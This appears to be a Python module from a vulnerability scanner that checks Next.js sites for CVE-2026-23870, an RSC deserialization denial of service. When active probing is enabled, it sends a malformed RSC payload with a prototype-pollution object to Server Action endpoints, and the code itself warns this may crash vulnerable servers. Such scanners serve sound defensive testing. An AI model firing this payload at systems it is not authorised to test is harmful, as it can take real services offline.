#!/usr/bin/env python3
"""
NextSploit — CVE-2026-23870: DoS via RSC Deserialization

Root Cause:
  App Router Server Actions in Next.js 13.x–15.5.15 mishandle malformed
  RSC deserialization data sent to action endpoints, triggering unhandled
  promise rejections that crash the Node.js process.

Detection Strategy:
  1. Version-based check (gating only — not sufficient alone for VULNERABLE).
  2. Precondition: App Router detected.
  3. Behavioral timing differential: send a malformed RSC flight payload and
     compare response time against a valid baseline. A significantly slower
     response suggests the parser is struggling with malformed data.
  4. RSC error indicator check: look for serialization-error patterns in body.
  Confidence tiers:
    0.80 — version match + timing anomaly (>3x) + RSC error pattern
    0.55 — version match + timing anomaly (>3x) only
    0.35 — version match only, no timing signal confirmed

Affected Versions:
  >= 13.0.0, < 15.5.16  (branch 15.x)
  >= 16.0.0, < 16.2.5   (branch 16.x)
Fixed In : 15.5.16 / 16.2.5
Severity : High
"""

import time
import re
import requests

from core.config import ScanConfig, CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding
from core.output import log_info, log_success, log_warning, log_debug, print_finding
from core.timing import measure_baseline_timing, is_timing_anomalous

CVE_ID   = "CVE-2026-23870"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Safe malformed RSC payload: triggers RSC parser but not large enough to real-DoS
_MALFORMED_RSC = b'2:["$","$L3",null,{"__proto__":{"polluted":true}},[]]\n0:null\n'
_VALID_RSC     = b'["baseline_rsc_probe"]\n'

# RSC error pattern in response body
_RSC_ERROR_RE = re.compile(
    r"(RSCError|deserializ|unhandledRejection|react.*flight.*error"
    r"|TypeError.*flight|ChunkDecodeError|Invalid.*RSC)",
    re.IGNORECASE,
)

def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    # Precondition: App Router required
    if not config.has_app_router():
        result.status = "NOT_APPLICABLE"
        log_info(f"[{CVE_ID}] Pages Router detected — skipping (App Router only).")
        return result

    # Version gating
    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None
    version_vulnerable = False
    if version_detected:
        log_debug(f"Detected version: {version_detected}")
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "PATCHED":
            log_success(f"Version {version_detected} is patched for {CVE_ID}.")
            return result
        if vuln_status == "VULNERABLE":
            version_vulnerable = True
            log_warning(f"Version {version_detected} is in the vulnerable range.")

    # Passive mode default: no active probe
    if not config.confirm_active:
        if version_vulnerable:
            result.status = "INCONCLUSIVE"
            result.add_finding(Finding(
                cve=CVE_ID,
                severity=CVE_INFO["severity"],
                title="Version range matches — behavioral RSC probe skipped (requires --confirm-active)",
                status="INCONCLUSIVE",
                detail="Version matches vulnerable range but no active probe executed.",
                evidence={"detected_version": version_detected},
                confidence=0.35,
            ))
        else:
            result.status = "SAFE"
        return result

    # Active probing begins (user explicitly opted in)
    log_warning("[!] This module sends a malformed RSC payload that may trigger DoS on vulnerable targets.")
    session = config.create_session()
    target = config.target.rstrip("/")
    endpoint = target + "/"

    # Baseline timing using valid RSC payload
    baseline_avg, baseline_stdev = measure_baseline_timing(
        session, endpoint, samples=5, method="POST", data=_VALID_RSC,
        headers={"Content-Type": "text/plain;charset=UTF-8", "Accept": "text/x-component", "Next-Action": "00000000baseline"},
        timeout=config.timeout, config=config
    )
    log_debug(f"Baseline RSC timing: avg={baseline_avg:.3f}s, stdev={baseline_stdev:.3f}s")

    # Probe with malformed RSC payload
    try:
        start = time.monotonic()
        r = session.post(
            endpoint,
            data=_MALFORMED_RSC,
            headers={"Content-Type": "text/plain;charset=UTF-8", "Accept": "text/x-component", "Next-Action": "00000000probe"},
            timeout=config.timeout,
        )
        probe_time = time.monotonic() - start
        config.record_request(r.status_code)
        log_debug(f"Malformed RSC probe: {probe_time:.3f}s, status={r.status_code}")
        rsc_error_found = bool(_RSC_ERROR_RE.search(r.text))
    except requests.Timeout:
        probe_time = config.timeout
        config.record_request(503)
        log_warning("Malformed RSC probe timed out — possible CPU saturation.")
        rsc_error_found = False
    except requests.RequestException as e:
        config.record_request(0)
        log_debug(f"Probe request failed: {e}")
        probe_time = None
        rsc_error_found = False

    # Determine anomaly via Z-score
    time_anomaly = False
    if probe_time is not None:
        time_anomaly = is_timing_anomalous(baseline_avg, baseline_stdev, probe_time)

    # Confidence tiers
    if version_vulnerable and time_anomaly and rsc_error_found:
        detail = (
            f"CONFIRMED: Next.js {version_detected} + malformed RSC payload caused "
            f"{probe_time:.0f}s response (baseline avg {baseline_avg:.0f}s) with error pattern — deserialization DoS signature detected."
        )
        confidence = 0.80
    elif version_vulnerable and time_anomaly:
        detail = (
            f"Next.js {version_detected} + malformed RSC probe took {probe_time:.0f}s vs baseline avg {baseline_avg:.0f}s. Timing anomaly consistent with RSC deserialization overhead."
        )
        confidence = 0.55
    elif version_vulnerable:
        detail = (
            f"Next.js {version_detected} is in the vulnerable range for {CVE_ID}. No timing anomaly detected (may be patched or target absorbs signal)."
        )
        confidence = 0.35
    else:
        result.status = "SAFE"
        return result

    evidence = {
        "detected_version": version_detected or "unknown",
        "baseline_avg_s": f"{baseline_avg:.3f}",
        "baseline_stdev_s": f"{baseline_stdev:.3f}",
        "probe_time_s": f"{probe_time:.3f}" if probe_time is not None else "timeout",
        "rsc_error_in_body": rsc_error_found,
        "remediation": "Upgrade Next.js to 15.5.16+ (15.x) or 16.2.5+ (16.x).",
    }
    log_warning(detail)
    print_finding(CVE_ID, detail, evidence)
    result.add_finding(Finding(
        cve=CVE_ID,
        severity=CVE_INFO["severity"],
        title="DoS via RSC Deserialization",
        status="VULNERABLE",
        detail=detail,
        evidence=evidence,
        confidence=confidence,
    ))
    return result
